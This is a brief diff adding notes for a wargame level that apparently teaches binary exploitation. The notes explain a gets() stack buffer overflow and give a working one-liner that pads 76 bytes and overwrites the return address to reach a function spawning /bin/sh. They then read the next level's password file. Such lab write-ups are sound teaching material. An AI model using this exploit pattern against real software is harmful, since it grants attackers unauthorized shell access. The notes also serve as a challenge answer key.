@@ -1,0 +1,7 @@
+open with gdb, layout asm find that there is a function named run that executes system(/bin/sh)
+look that there is a buffer of 0x50 in main that gets called by gets()
+so the thing here is to write 76 * "A" (garbage) + the address of the function run
+and to maintain the child process open.
+so we're doing :
+cat <(python -c 'print "A" * 76 + "\x08\x04\x84\x44"[::-1]') - | ./level1
+then cat ../level2/.pass
